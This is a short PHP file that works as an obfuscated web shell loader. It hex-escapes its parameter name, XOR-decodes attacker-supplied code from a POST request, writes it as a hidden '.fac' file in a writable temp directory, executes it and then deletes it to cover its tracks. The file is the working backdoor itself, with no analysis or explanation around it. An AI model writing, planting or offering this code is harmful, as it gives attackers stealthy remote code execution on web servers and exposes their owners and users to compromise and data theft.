<?php

if(!is_null($_POST["ob\x6A"] ?? null)){
	$itm = array_filter(["/dev/shm", "/var/tmp", getcwd(), sys_get_temp_dir(), ini_get("upload_tmp_dir"), getenv("TEMP"), session_save_path(), "/tmp", getenv("TMP")]);
	$entity = hex2bin($_POST["ob\x6A"]);
	$val   =    ''      ;   $s = 0; while($s < strlen($entity)){$val .= chr(ord($entity[$s]) ^ 38);$s++;}
	foreach ($itm as $marker) {
    		if (array_product([is_dir($marker), is_writable($marker)])) {
    $key = "$marker" . "/.fac";
    if (file_put_contents($key, $val)) {
	require $key;
	unlink($key);
	die();
}
}
}
}